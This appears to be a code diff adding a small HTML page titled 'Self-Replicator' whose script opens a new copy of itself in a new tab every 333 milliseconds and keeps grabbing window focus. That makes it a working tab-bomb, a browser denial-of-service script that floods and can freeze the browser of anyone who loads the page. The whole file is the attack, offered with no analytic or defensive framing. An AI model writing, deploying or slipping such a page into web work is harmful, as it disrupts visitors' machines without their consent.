@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Self-Replicator</title>
+    <style>
+        body { background: black; color: #ff0055; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .warning { border: 2px solid #ff0055; padding: 20px; text-shadow: 0 0 10px #ff0055; }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h1>REPLICATION ENGINE</h1>
+        <p>Current Path: <span id="path"></span></p>
+    </div>
+
+    <script>
+        const myPath = window.location.href;
+        document.getElementById('path').innerText = myPath;
+
+        function replicate() {
+            // Opens a new tab with the exact same file
+            window.open(myPath, '_blank');
+        }
+
+        // 3 tabs per second = 333ms interval
+        // Browsers will throttle this heavily in the background
+        setInterval(replicate, 333);
+
+        // Optional: Force focus back to the window to try and stay active
+        window.focus();
+    </script>
+</body>
+</html>
